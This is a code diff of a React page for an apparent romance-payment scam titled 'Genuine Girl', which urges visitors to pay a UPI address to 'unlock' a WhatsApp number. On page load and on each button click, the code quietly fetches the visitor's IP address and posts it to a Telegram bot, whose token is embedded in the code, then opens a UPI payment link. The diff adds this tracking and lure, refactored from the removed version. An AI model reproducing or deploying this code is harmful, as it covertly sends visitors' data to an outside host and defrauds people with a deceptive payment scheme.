@@ -1,39 +1,66 @@
 import './App.css';
-
+import React, { useEffect } from 'react';
 let ip = 'Not Found'
 
-
+async function sendUpdate(msg) {
+  setTimeout(() => {
+    fetch('https://api.db-ip.com/v2/free/self')
+      .then(result => result.json())
+      .then((output) => {
+        ip = output;
+        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${msg}--------${ip.ipAddress}`
+        fetch(url, {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: ''
+        }).then(res => {
+          console.log("Request complete!");
+          window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=Genuine_Girl", "_self");
+        })
+      }).catch(err => console.error(err));
+  })
+}
 
 function App() {
-  setTimeout(()=>{
-    fetch('https://api.db-ip.com/v2/free/self')
-    .then(result => result.json())
-    .then((output) => {
-        ip = output;
-        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=PAYMENT--------${ip.ipAddress}`
-        fetch(url, {
-            method: "POST",
-            headers: { 'Content-Type': 'application/json' },
-            body: ''
-        }).then(res => {
-            console.log("Request complete!");
-            window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ReddyGirl","_self");
-        })
-    }).catch(err => console.error(err));
-  },200)
+  useEffect(() => {
+    sendUpdate("Home")
+  }, [])
+  const handlepayButton = async () => {
+    await sendUpdate("PayButton")
+    window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=Genuine_Girl", "_self");
+  }
+
+  const handleWspButton = async () => {
+    await sendUpdate("PayButton")
+    window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=Genuine_Girl", "_self");
+  }
+
   return (
     <div className="App">
       <header className="App-header">
-      <h1 style={{marginTop:"-50px", paddingBottom:'0px'}}>🍆Genuine Girl!!🍆</h1>
-      <a  id="myButton1" className="button" type="button" href="upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ReddyGirl">PAY NOW!!</a>
-      <h6>You should PAY first to Unlock My Number!!😜</h6>
-      <a  id="myButton1" className="button" type="button" href="upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ReddyGirl">PAY NOW!!</a>
-      <h6>Click Below👇 For My Whatsapp Number!!</h6>
-      <a  id="myButton" className="button1" type="button" href="upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ReddyGirl">Whatsapp!!</a>
-      <h6>PAY NOW and Send me screenshot on Telegram!!🥰</h6>
+        <h1 style={{ marginTop: "-50px", paddingBottom: '0px' }}>🍆Genuine Girl!!🍆</h1>
+        <button className='button' onClick={() => { handlepayButton() }}>PAY NOW!!</button>
+        <h6>You should PAY first to Unlock My Number!!😜</h6>
+        <CopyExample />
+        <h6 style={{ marginBottom: "5px" }}>Click Below👇 For My Whatsapp Number!!</h6>
+        <button className='button' onClick={() => { handleWspButton() }}>Whatsapp Number!</button>
+        <h6>PAY NOW and Send me screenshot on Telegram!!🥰</h6>
       </header>
     </div>
   );
 }
+
+function CopyExample() {
+  return (
+    <div className='card'>
+      <p style={{ margin: "0px", color: "mistyrose", fontWeight: 'bold' }}>Pay to my UPI Adress if Button is Not Working👇🏻👇🏻👇🏻</p>
+      <div style={{ display: "flex", padding: "15px" }}>
+        <input readOnly value={"bharatpe.0851610820@icici"}></input >
+        <button className='cpybutton' onClick={async () => { await sendUpdate('Copied'); navigator.clipboard.writeText('bharatpe.0851610820@icici') }}>Copy</button>
+      </div>
+    </div>
+  );
+}
+
 
 export default App;
